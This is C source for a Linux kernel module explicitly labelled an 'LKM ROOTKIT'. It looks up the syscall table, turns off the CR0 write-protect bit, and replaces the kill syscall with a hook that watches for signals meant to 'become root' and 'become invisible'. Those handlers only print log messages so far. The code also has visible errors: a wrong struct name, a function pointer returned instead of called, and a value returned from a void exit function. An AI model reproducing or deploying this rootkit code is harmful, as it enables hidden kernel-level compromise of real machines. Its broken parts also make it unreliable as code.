#include <linux/init.h>
#include <linux/module.h> //loading LKMs into kernel
#include <linux/kernel.h>
#include <linux/kallsyms.h> //contains functions like kallsysms_lookup_name
#include <linux/unistd.h> //contains syscall numbers
#include <linux/version.h>
#include <linux/dirent.h>
#include <asm/paravirt.h>

//Module info
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AP");
MODULE_DESCRIPTION("LKM ROOTKIT");
MODULE_VERSION("0.0.1");

unsigned long * __sys_call_table = NULL;

#ifdef CONFIG_X86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct ptregs *regs);
static ptregs_t orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
#endif
#endif

enum signals
{
    SIGSUPER = 64, //become root
    SIGINVIS = 63  //become invisible
};

#if PTREGS_SYSCALL_STUB

static asmlinkage long hack_kill (const struct pt_regs *regs)
{
    int sig = regs->si;

    if (sig == SIGSUPER)
    {
        printk(KERN_INFO "SIGSUPER signal receive --- become root\n");
        return 0;
    }

    else if (sig == SIGINVIS)
    {
        printk(KERN_INFO "SIGINVIS signal receive --- hide self\n");
        return 0;
    }

    printk(KERN_INFO "***hacked syscalls***\n");
    return orig_kill;
}

#else
static asmlinkage long hack_kill (pid_t pid, int sig)
{
    if (sig == SIGSUPER)
    {
        printk(KERN_INFO "SIGSUPER signal receive --- become root\n");
        return 0;
    }

    else if (sig == SIGINVIS)
    {
        printk(KERN_INFO "SIGINVIS signal receive --- hide self\n");
        return 0;
    }

    printk(KERN_INFO "***hacked syscalls***\n");
    return orig_kill;
}

#endif

static int store(void)
{
#if PTREGS_SYSCALL_STUB
    orig_kill = (ptregs_t) __sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");

#else
    orig_kill = (orig_kill_t) __sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");

#endif

    return 0;
}

static int cleanup(void)
{
    __sys_call_table[__NR_kill] = (unsigned long) orig_kill;
    printk(KERN_INFO "cleanup successful\n");

    return 0;
}

int hook(void)
{
    __sys_call_table[__NR_kill] = (unsigned long) &hack_kill;
    printk(KERN_INFO "hooked kill syscall\n");

    return 0;
}

static unsigned long * get_syscall_table(void)
{
    unsigned long * syscall_table;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
    syscall_table = (unsigned long *) kallsyms_lookup_name("sys_call_table ");
#else
    syscall_table = NULL;
#endif

    return syscall_table;
}

static inline void
write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void
protect_memory(void)
{
    write_cr0_forced(read_cr0() | (0x00010000));
    printk(KERN_INFO "protected memory\n");
}

static inline void
unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & ~0x00010000);
    printk(KERN_INFO "unprotected memory\n");
}

static int __init mod_init(void)
{
    int err = 1;
    printk(KERN_INFO "rootkit: init\n" );

    __sys_call_table = get_syscall_table();

    if (!__sys_call_table)
    {
        printk(KERN_INFO "error getting syscall table\n" );
        return err;
    }

    if (store() != 0)
    {
        printk(KERN_INFO "store error\n" );
        return err;
    }

    unprotect_memory();

    if (hook() != 0)
    {
        printk(KERN_INFO "hooking error\n" );
        return err;
    }

    protect_memory();

    return 0;
}

static void __exit mod_exit(void)
{
    int err = 1;

    printk(KERN_INFO "rootkit: exit\n" );

    unprotect_memory();

    if (cleanup() != 0)
    {
        printk(KERN_INFO "cleanup error\n");
        return err;
    }

    protect_memory();
}

module_init(mod_init);
module_exit(mod_exit);
